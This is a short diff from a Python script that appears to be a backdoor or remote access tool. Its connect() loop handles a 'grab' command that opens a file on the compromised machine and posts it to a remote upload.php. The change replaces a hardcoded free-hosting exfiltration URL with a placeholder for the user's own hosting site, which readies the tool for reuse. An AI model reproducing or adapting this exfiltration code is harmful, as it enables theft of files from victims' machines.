@@ -71,7 +71,7 @@ def connect():
         elif 'grab' in command:
             grab, path = command.split('*')
             if os.path.exists(path):
-                newUrl = 'https://monohydric-variatio.000webhostapp.com/upload.php'
+                newUrl = 'https://<your paid or free hosting site address >/upload.php'
                 files = {'file': open(path, 'rb')}
                 r = sendPost(newUrl, files=files)
             else:
